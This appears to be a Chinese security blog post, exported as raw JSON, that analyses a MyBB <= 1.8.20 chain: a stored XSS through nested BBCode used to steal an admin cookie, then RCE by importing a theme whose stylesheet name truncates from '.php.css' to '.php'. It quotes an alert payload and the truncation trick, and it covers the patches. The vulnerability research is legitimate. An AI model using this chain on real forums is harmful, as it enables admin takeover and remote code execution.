3.RCE漏洞的入口\n\n关于RCE漏洞的入口，作者原文描述如下:\n\n [![69](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463197_69.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463197_69.png)\n\n在此处，作者多次提到create与choose the filename字眼，一度让我认为漏洞存在于创建与修改Theme处，如下图\n\n [![70](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463671_70.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463671_70.png)\n\n或是修改Template Name处，如下图\n\n [![71](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463921_71.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463921_71.png)\n\n在尝试寻找rce入口时，发现一处有意思的地方，当修改templates为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css时\n\n [![72](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464218_72.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464218_72.png)\n\n保存后，程序会将.css截断，并提示后缀问题，如下图\n\n [![73](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464587_73.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464587_73.png)\n\n在跟踪此处代码时发现，在修改template name时，程序是会检查文件名长度并截断的，控制template name长度为30字符，如下图\n\n [![74](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464861_74.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464861_74.png)\n\n这里可以印证，漏洞入口并不在修改名字和创建template处，经过后来的分析与寻找，才找到上文中真正的入口点，也就是Import a Theme处。但是从这个过程可见，mybb对文件名长度还是有一定限制的，只是防护的有疏漏，忘记检查导入的xml结构中的name字段长度。\n\n&nbsp;\n\n## **0x04 漏洞修复**\n* * *\n\n### **xss漏洞**\n\n针对xss漏洞，使用encode_url方法替换原来的htmlspecialchars_uni，如下图\n\n [![75](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465133_75.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465133_75.png)\n\n回顾上文，在漏洞利用中，id中的内容为嵌套的url bbcod代码\n\n [![76](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465356_76.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465356_76.png)\n\n当id被url编码后，之后在通过正则解析url bbcod代码时，该处被编码后的内容就不会被正则匹配到，从而防止嵌套解析造成xss漏洞\n\n### RCE漏洞\n\n针对rce漏洞，使用my_substr方法限制name长度为30字符，如下图\n\n [![77](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465669_77.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465669_77.png)\n","slug":"MyBB-RCE","published":1,"updated":"2020-10-27T09:25:29.510Z","_id":"ckgrozuak006fwsa94lzl1m4k","comments":1,"layout":"post","photos":[],"link":"","content":"<div align=\"center\"></div>\n\n<p>MyBB是国际上非常优秀的免费论坛软件，最大的特色是简单但是功能却出奇的强大，支持多国语言，可以分别设置前台后台的语言。</p>\n<p>MyBB作为一个开源项目，拥有活跃的社区环境，项目的管理,发展由社区志愿者支持。用户量广泛，在github上的项目拥有609 个star，79个releases。</p>\n<p>MyBB &lt;= 1.8.20存在一处从存储的XSS到RCE组合利用漏洞，攻击者可以先通过xss获得管理员权限，再通过rce达到远程代码执行。这套利用流程不仅隐蔽而且利用难度低，只要私信给mybb管理员发出一条包含payload的消息即可。</p>\n<a id=\"more\"></a>\n\n<p>该漏洞由RIPS 团队安全研究人员Simon Scannell发现并纰漏。但截止目前，并未公布利用poc</p>\n<p>我们试图从Simon Scannell简单的漏洞披露中深入分析该漏洞，并尝试还原出poc</p>\n<p>首先分析下mybb xss漏洞</p>\n<p>&nbsp;</p>\n<h2 id=\"0x01-XSS漏洞\"><a href=\"#0x01-XSS漏洞\" class=\"headerlink\" title=\"0x01 XSS漏洞\"></a><strong>0x01 XSS漏洞</strong></h2><hr>\n<p>此漏洞为mybb对BBCode的错误解析而造成的</p>\n<p>首先了解下BBCode:</p>\n<p>BCode是Bulletin Board Code的缩写，属于轻量标记语言（Lightweight Markup Language）的一种，如字面上所表示的，它主要是使用在BBS、论坛、Blog等网络应用上。BBcode的语法通常为 [标记] 这种形式，即语法左右用两个中括号包围，以作为与正常文字间的区别。系统解译时遇上中括号便知道该处是BBcode，会在解译结果输出到用户端时转换成最为通用的HTML语法。</p>\n<p>下图举个简单的例子：</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408424824_0.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408424824_0.png\" alt=\"0\"></a></p>\n<p>在BBcode中给关键词加链接可以用下面的代码：</p>\n<p>[url=<a href=\"https://www.xiongbenxiongbenxiong.com/1.html\">https://www.xiongbenxiongbenxiong.com/1.html</a>]熊本熊本熊[/url]</p>\n<p>然而，BBcode只是一种标记语言，并没有一个共同的标准。各个BBS、论坛、Blog等网络应用程序可能会有自己独创的BBcode。在实际场景中，不同的程序会在后台使用不同的方式将BBcode解析成html来进行页面渲染</p>\n<p>接下来看下mybb程序对BBCode的解析流程</p>\n<p>举一个例子，使用BBcode格式分别插入的一条视频链接与一条url链接</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425165_1.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425165_1.png\" alt=\"1\"></a></p>\n<p>Mybb程序会对BBcode进行解析，以便转化为浏览器可识别的html语言</p>\n<p>Mybb首先会对video链接进行解析（注意：这与video和url的排列顺序无关，在程序的后台，会首先处理video，后处理url）</p>\n<p>经过video解析器解析后的格式如下</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425474_2.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425474_2.png\" alt=\"2\"></a></p>\n<p>接着mybb对BBCode格式的url进行解析，经过url解析器解析后的格式如下</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425622_3.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425622_3.png\" alt=\"3\"></a></p>\n<p>此时，mybb以将BBcode语言解析成为html语言，浏览器渲染页面，显示嵌入的video与超链接中的url</p>\n<p>如果，我们将两个BBCode格式的语句进行嵌套呢？</p>\n<p>像如下图这样的形式</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040842598_4.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040842598_4.png\" alt=\"4\"></a></p>\n<p>按照我们的推测，会进行如下的解析：</p>\n<p>首先，解析video</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084302100_5.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084302100_5.png\" alt=\"5\"></a></p>\n<p>解析之后的格式如上图</p>\n<p>然后，解析url，也就是下图红框处的结构</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430523_6.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430523_6.png\" alt=\"6\"></a></p>\n<p>解析之后的结果如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430716_7.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430716_7.png\" alt=\"7\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431056_8.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431056_8.png\" alt=\"8\"></a></p>\n<p>注意上图红框这里，src中的值，被href引入的双引号闭合，而onmusemove成功逃逸出来，意味着alert会在鼠标移动时，alert将会被执行</p>\n<p>事实上，以上的流程，在mybb中是否成立。正式因为上文猜测中的嵌套解析，造成了此次xss漏洞</p>\n<p>接下来跟下代码</p>\n<p>首先，我们给管理员（admin）账号发一条如下图bbcode语言的私信</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431490_9.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431490_9.png\" alt=\"9\"></a></p>\n<p>这条私信会原封不动的被写入数据库中</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431789_10.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431789_10.png\" alt=\"10\"></a></p>\n<p>当管理员查看私信时，这条message会被从数据库中取出，并解析为html语言进行渲染</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432090_11.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432090_11.png\" alt=\"11\"></a></p>\n<p>程序调用private.php执行上述操作，跟进private.php</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040843246_12.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040843246_12.png\" alt=\"12\"></a></p>\n<p>在997行处，程序将留言从数据库中取出，并赋值$pm</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432858_13.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432858_13.png\" alt=\"13\"></a></p>\n<p>在11789行处，将$pm传入build_postbit方法</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433134_14.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433134_14.png\" alt=\"14\"></a></p>\n<p>跟入build_postbit方法</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433443_15.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433443_15.png\" alt=\"15\"></a></p>\n<p>在该方法774行处，将message传入parse_message,这里的message即为我们构造的BBCode语句</p>\n<p>跟入parse_message方法</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434148_16.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434148_16.png\" alt=\"16\"></a></p>\n<p>在parse_message方法中201行处，调用parse_mycode对$message进行处理</p>\n<p>跟入parse_mycod方法</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434479_17.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434479_17.png\" alt=\"17\"></a></p>\n<p>如上图，第一个红框处，会对bbcode中的video结构进行解析，而第二个红框处，会对url,email等结构进行解析。正因为这里的解析的先后顺序，决定了构造poc时的嵌套顺序</p>\n<p>首先来看video解析</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434815_18.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434815_18.png\" alt=\"18\"></a></p>\n<p>这里使用了preg_replace_callback，对匹配到的内容使用mycode_parse_video_callback回调进行替换</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435155_19.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435155_19.png\" alt=\"19\"></a></p>\n<p>跟入mycode_parse_video_callback</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435498_20.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435498_20.png\" alt=\"20\"></a></p>\n<p>可见mycode_parse_video_callback将$matches[1], $matches[2]传入mycode_parse_video方法</p>\n<p>跟入mycode_parse_video方法</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435737_21.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435737_21.png\" alt=\"21\"></a></p>\n<p>如下图，首先使用parse_url对传入的url($matches[2])进行解析</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440199_22.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440199_22.png\" alt=\"22\"></a></p>\n<p>解析后的parsed_url值如下图</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440475_23.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440475_23.png\" alt=\"23\"></a></p>\n<p>接着，将$parsed_url[‘fragment’]赋值与$ fragment</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440715_24.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440715_24.png\" alt=\"24\"></a></p>\n<p>随后，进入switch语句，根据不同视频来源，分情况解析。我们这里构造的是youtbe来源，进入该分支</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441164_25.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441164_25.png\" alt=\"25\"></a></p>\n<p>在下图中，将$ fragment中的!v=置空，赋值与$id</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441466_26.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441466_26.png\" alt=\"26\"></a></p>\n<p>此时id值为test[url=onmousemove=’alert(1337)’]</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441887_27.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441887_27.png\" alt=\"27\"></a></p>\n<p>随后，由于担心xss攻击，程序在这里对$id进行html特殊字符转义处理，如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442138_28.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442138_28.png\" alt=\"28\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442429_29.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442429_29.png\" alt=\"29\"></a></p>\n<p>接着，从templates中取出对应video的模板，如下图$templates get方法</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442779_30.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442779_30.png\" alt=\"30\"></a></p>\n<p>根据get方法，看下取出模板的形式</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084430100_31.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084430100_31.png\" alt=\"31\"></a></p>\n<p>上图为最终生成html的模板，此处的$id即为上文中case分支中赋值的$id</p>\n<p>最终，将$id值填充的模板中，结果如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443348_32.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443348_32.png\" alt=\"32\"></a></p>\n<p>回到preg_replace_callback处，$message替换后的结果如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443628_33.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443628_33.png\" alt=\"33\"></a></p>\n<p>此时$message=&lt;iframe width=”560” height=”315” src=”//<a href=\"http://www.youtube.com/embed/test[url=onmousemove=&#39;alert(1337)&#39;]&quot;\">www.youtube.com/embed/test[url=onmousemove=&#39;alert(1337)&#39;]&quot;</a> frameborder=”0” allowfullscreen&gt;&lt;/iframe&gt;[/url]</p>\n<p>Video的解析到此结束了，此时html语句，是不是和上文流程中猜测的形式一样呢？</p>\n<p>&nbsp;</p>\n<p>接下来，仍然使用preg_replace_callback对url进行替换</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443948_34.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443948_34.png\" alt=\"34\"></a></p>\n<p>如下图可见，使用#[url=((?!javascript)[a-z]+?://)([^</p>\n<p>“&lt;]+?)](.+?)[/url]#si正则进行匹配，使用</p>\n<p>mycode_parse_url_callback1回调对$message进行替换</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444218_35.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444218_35.png\" alt=\"35\"></a></p>\n<p>此处的处理与上文中的video极其相似，这里就不重复说明了</p>\n<p>在url解析结束后，messgae值如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444522_36.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444522_36.png\" alt=\"36\"></a></p>\n<p>可见，如上文流程分析一致，href中引入的双引号，将src闭合了，onmousemove得以逃逸</p>\n<p>最终，xss产生</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444935_37.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444935_37.png\" alt=\"37\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445217_38.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445217_38.png\" alt=\"38\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445522_39.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445522_39.png\" alt=\"39\"></a></p>\n<p>利用给管理员私信的这个功能，通过xss漏洞，可以获取管理员cookie，从而获得后台权限</p>\n<p>接下来分析下rce漏洞</p>\n<p>&nbsp;</p>\n<h2 id=\"0x02-RCE漏洞\"><a href=\"#0x02-RCE漏洞\" class=\"headerlink\" title=\"0x02 RCE漏洞\"></a><strong>0x02 RCE漏洞</strong></h2><hr>\n<p>Mybb后台提供导入theme功能</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445899_40.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445899_40.png\" alt=\"40\"></a></p>\n<p>可以选择本地theme进行导入，上传的theme格式许为xml格式，形式如下</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450222_41.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450222_41.png\" alt=\"41\"></a></p>\n<p>这里的导入的xml文件存储了该theme下所有包含的css文件，下面展示其中两个片段</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450698_42.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450698_42.png\" alt=\"42\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450976_43.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450976_43.png\" alt=\"43\"></a></p>\n<p>简单来说，相当于是把这个theme里包含的所有css都存储到xml一个结构里</p>\n<p>在上传xml格式的theme时，程序后台会解析该xml，如下图代码</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451292_44.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451292_44.png\" alt=\"44\"></a></p>\n<p>随后，将解析的xml树中的内容，例如css名称，内容、id等写入数据库</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451570_45.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451570_45.png\" alt=\"45\"></a></p>\n<p>上图即为解析上传的xml格式的theme，将解析出的css的信息入库的操作</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451874_46.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451874_46.png\" alt=\"46\"></a></p>\n<p>入库后，数据库中内容如上图</p>\n<p>在解析xml内的css数据的name时，后台程序会校验css的后缀是否合法</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452251_47.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452251_47.png\" alt=\"47\"></a></p>\n<p>可见，程序要求xml结构中，css文件后缀应为.css。但其校验方式仅仅检测css名称后四位是否为.css</p>\n<p>当我们构造css数据时，可以使得css文件名为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css,在css文件内容处插入payload，如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452587_48.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452587_48.png\" alt=\"48\"></a></p>\n<p>在xml解析后，$stylesheet[‘attributes’][‘name’]的值为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css，成功绕过检测</p>\n<p>当进行入库操作时，如下图代码</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452876_49.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452876_49.png\" alt=\"49\"></a></p>\n<p>此时将要插入表中name字段的值为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css，由于mysql默认字段长度为30字符，而我们的name长度为34字符，所以，.css会被截断，最终插入表中name字段的值为aaaaaaaaaaaaaaaaaaaaaaaaaa.php。</p>\n<p>与此同时，aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css中的内容，会插入到stylesheet字段中，我们构造的payload随同aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css中的内容，一同写入数据库。</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453146_50.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453146_50.png\" alt=\"50\"></a></p>\n<p>程序在执行xml数据从解析到入库的操作的同时，也会在本地生成对应的文件，如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453593_51.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453593_51.png\" alt=\"51\"></a></p>\n<p>这里生成文件名仍是.css后缀。原因很好理解：这里生成的文件名由解析上传的xml文件中的css name值决定的，如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453755_52.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453755_52.png\" alt=\"52\"></a></p>\n<p>因此后缀为.css</p>\n<p>&nbsp;</p>\n<p>接下来在后台页面中，查看我们刚刚导入的theme</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454088_53.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454088_53.png\" alt=\"53\"></a></p>\n<p>可以看到我们grq themes里的css列表中，后缀已经变为php</p>\n<p>这是为什么呢？原因很简单，因为此处展示的内容，是从数据库中查询得到，此时数据库内容如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454318_54.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454318_54.png\" alt=\"54\"></a></p>\n<p>数据库由于30字符最大长度的截断，已经把入库的文件名后的.css截断了，此时数据库中name的后缀变为php</p>\n<p>这时，点击Stylesheets in grq 列表中的aaaaaaaaaaaaaaaaaaaaaaaaaa.php，进入编辑页面</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454721_55.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454721_55.png\" alt=\"55\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455075_56.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455075_56.png\" alt=\"56\"></a></p>\n<p>再次查看后台文件夹，可见生成了一个.php后缀文件，如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040845533_57.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040845533_57.png\" alt=\"57\"></a></p>\n<p>这里的原理也很简单。点击编辑css文件时，程序会从数据库中读取该文件的name以及内容，</p>\n<p>并判断在指定目录中是否存在，若不存在，则用数据库中取出的name为文件名，生成文件，并将数据库中取出的内容写入该文件中</p>\n<p>由于此时库中的name为aaaaaaaaaaaaaaaaaaaaaaaaaa.php，所以在指定位置生成了aaaaaaaaaaaaaaaaaaaaaaaaaa.php文件</p>\n<p>下面跟下php文件生成的流程与代码</p>\n<p>在点击aaaaaaaaaaaaaaaaaaaaaaaaaa.php，进入其编辑页面这个操作</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455691_58.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455691_58.png\" alt=\"58\"></a></p>\n<p>&nbsp;</p>\n<p>此时发送请求如下</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455935_59.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455935_59.png\" alt=\"59\"></a></p>\n<p>后台代码执行如下：</p>\n<p>首先进入</p>\n<p>\\admin\\modules\\style\\themes.php</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460279_60.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460279_60.png\" alt=\"60\"></a></p>\n<p>此时的action为edit_stylesheet，进入上图分支</p>\n<p>接着从数据库中查询该条数据，执行的sql语句如下</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460538_61.png\"><img src= \"/img/loading.gif\" 